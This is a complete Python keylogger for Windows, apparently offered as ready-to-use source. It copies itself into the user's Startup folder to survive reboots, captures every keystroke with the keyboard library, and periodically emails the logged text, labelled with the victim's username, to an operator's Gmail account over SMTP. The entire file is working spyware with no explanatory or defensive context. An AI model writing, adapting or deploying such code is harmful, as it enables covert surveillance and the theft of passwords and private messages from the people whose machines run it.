#!/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import smtplib
import keyboard
import tempfile
import shutil
import sys

from smtplib import SMTP
from threading import Timer
from datetime import datetime

# Move this file in startup directory

if os.name == 'nt':
	startup_dir = f'{os.getenv("SystemDrive")}\\Users\\{str(os.getlogin()).strip()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
	if os.path.exists(startup_dir):
		current_file = sys.argv[0]
		shutil.move(current_file, startup_dir + '\\' + os.path.basename(__file__))


class KL(object):
	def __init__(self,
				interval = 600, # Default interval: 10 min
				smtp_username = False,
				smtp_password = False,
				directory = tempfile.gettempdir()):
		super(KL, self).__init__()
		self.login_data = {
			'email': smtp_username,
			'password': smtp_password
		}

		self.temp_dir = directory
		self.interval = int(interval)
		self.uname = os.getenv('USERNAME')
		self.temp_logs = ''


	def filter(self, event):
		event_name = event.name
		if len(event_name) > 1:
			if event_name == 'space':
				event_name = ' '
			elif event_name == 'shift':
				event_name = ''
			elif event_name == 'decimal':
				event_name = '.'
			elif event_name == 'enter':
				event_name = '[ENTER]\n'
			elif event_name == 'ctrl':
				event_name = ''
			elif event_name == 'backspace':
				event_name = '[DELETE]'
			else:
				event_name = ''
		self.temp_logs += event_name


	def send_logs(self):
		try:
			smtp = SMTP(host="smtp.gmail.com", port=587)
			smtp.starttls()
			smtp.login(self.login_data['email'], self.login_data['password'])
			smtp.sendmail(self.login_data['email'], self.login_data['email'], f'Subject: Keylogs from: {self.uname}\n\n{self.temp_logs}')
			print('[1] Successfully Sent.')
			return True
		except Exception as e:
			print(f'[0] {e}')
			return False
		finally:
			smtp.quit()



	def start_listen(self):
		keyboard.on_release(callback=self.filter)
		self.send_data()
		keyboard.wait()



	def send_data(self):
		if self.temp_logs:
			try:
				self.send_logs()
				self.temp_logs = ''
			except Exception as err:
				send_func = self.send_logs()
				while not send_func:
					send_func = self.send_logs()
		
		timer = Timer(interval=self.interval, function=self.send_data)
		timer.daemon = True
		timer.start()


if __name__ == '__main__':
	logger = KL(interval=10, smtp_username='', smtp_password='')
	logger.start_listen()